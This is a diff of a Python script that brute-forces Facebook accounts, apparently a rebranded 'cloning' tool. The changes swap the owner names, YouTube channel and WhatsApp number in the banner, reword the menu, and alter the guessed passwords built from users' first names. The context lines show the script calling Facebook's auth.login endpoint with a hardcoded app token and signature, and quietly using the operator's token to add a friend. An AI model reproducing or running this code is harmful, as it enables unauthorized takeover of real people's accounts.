@@ -51,10 +51,10 @@ logo=""" \033[1;97m _    _                  _
  | |  | | | (_| | | (__  |   <  |  __/ | |   
  |_|  |_|  \__,_|  \___| |_|\_\  \___| |_|"""   
 logo1=('══════════════════════════════════════════════════')     
-logo2='             Owner   :- Badhßhah'
-logo3='             Author  :- Sachin Shrivastv'
-logo4='             Youtube :- Badhshah Hacker'
-logo5='             Whatsapp:- +977-9845844301'
+logo2='             Owner   :- Nam To Suna Hoga'
+logo3='             Author  :- Arbab Ali Memon'
+logo4='             Youtube :- CyberGangeHiddenTricker'
+logo5='             Whatsapp:- +923003023263'
 def tik():
 	titik = ['.   ','..  ','... ']
 	for o in titik:
@@ -117,7 +117,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n \033[1;97mLogin Successful...'
-				os.system('xdg-open https://chat.whatsapp.com/JJOVjf9DdsA9o4FeXVol6W ') #Whatsapp Group invite
+				os.system('xdg-open https://m.youtube.com/channel/UC23obpgnG79fUSXS7QnEnTA ') #Youtube Channel invite
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -212,9 +212,9 @@ def super():
 	print(logo4)
 	print(logo5)
 	print(logo1)
-	print " \033[1;97m[1]>>>>> \033[1;97mClone From Friend List..."
-	print " \033[1;97m[2]>>>>> \033[1;97mClone From Public ID..."
-	print " \033[1;97m[0]>>>>> \033[1;97mBack"
+	print " \033[1;97m[1]>>>>> \033[1;97mLogin Id ki watt laga..."
+	print " \033[1;97m[2]>>>>> \033[1;97mDoosre ki id ki watt laga ..."
+	print " \033[1;97m[0]>>>>> \033[1;97mBack Chal Kalti Mar"
 	pilih_super()
 
 def pilih_super():
@@ -334,7 +334,7 @@ def pilih_super():
 									cek.close()
 									cekpoint.append(user+pass3)
 								else:
-									pass4 = 'Pakistan143'
+									pass4 = 'Pakistan'
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
 									if 'access_token' in q:
@@ -425,7 +425,7 @@ def pilih_super():
 																		else:
 																			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 																			b = json.loads(a.text)
-																			pass9 = b['first_name'] + '@123'
+																			pass9 = b['first_name'] + '11'
 																			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																			q = json.load(data)
 																			if 'access_token' in q:
@@ -444,7 +444,7 @@ def pilih_super():
 																				else:
 																					a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 																					b = json.loads(a.text)
-																					pass10 = b['first_name'] + '@#&123'
+																					pass10 = b['first_name'] + '1122'
 																					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 																					q = json.load(data)
 																					if 'access_token' in q:
